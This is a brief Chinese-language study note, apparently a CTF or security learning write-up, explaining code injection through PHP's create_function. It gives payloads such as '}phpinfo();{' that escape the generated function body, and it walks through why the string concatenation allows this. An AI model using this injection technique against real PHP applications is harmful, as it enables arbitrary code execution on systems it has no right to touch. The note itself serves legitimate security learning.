## create_function

参考文章：
- https://secure.php.net/manual/zh/function.create-function.php
- http://www.laruence.com/2010/06/20/1602.html
- https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#function

### 利用
**函数结构：**
```php
create_function ( string $args , string $code ) : string
```

**测试代码：**
```php
create_function('$a', '}phpinfo();{'); # 执行phpifno()
create_function('$a', '}phpinfo();/*');
```
![](/images/19-7-10_PHP_create_function_1.png)

**原因：**
因为create_function采用拼接的方法构造函数，所以上述过程可以想象成如下：
```php
源代码：
function fT($a) {
  echo "test".$a;
}

注入后代码：
function fT($a) {
  echo "test";}
  phpinfo();/*;
}

*/  ### 这一行是为了关闭上一个注入代码的注释
注入后的代码：
function fT($a) {
  echo "test";}
  phpinfo();{;
}
```